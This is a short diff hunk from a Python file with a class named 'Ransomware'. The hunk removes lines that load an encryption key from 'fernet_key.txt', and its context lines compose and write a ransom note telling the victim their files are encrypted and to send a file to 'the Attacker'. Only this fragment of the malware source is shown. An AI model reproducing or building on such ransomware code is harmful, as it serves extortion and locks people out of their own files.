@@ -148,9 +148,6 @@ class Ransomware:
 		#Prompt Note To Victim
 		note=f"Your Files Have Been Encrypted. Get The Full Code At https://github.com/whokilleddb. Also Send {self.sysRoot}/Desktop/EMAIL_ME.txt to the Attacker"
 
-		with open("fernet_key.txt",'rb') as fp :
-			self.key= fp.read()
-
 		with open('RANSOM_NOTE.txt','w') as f:
 			f.write(note)
 
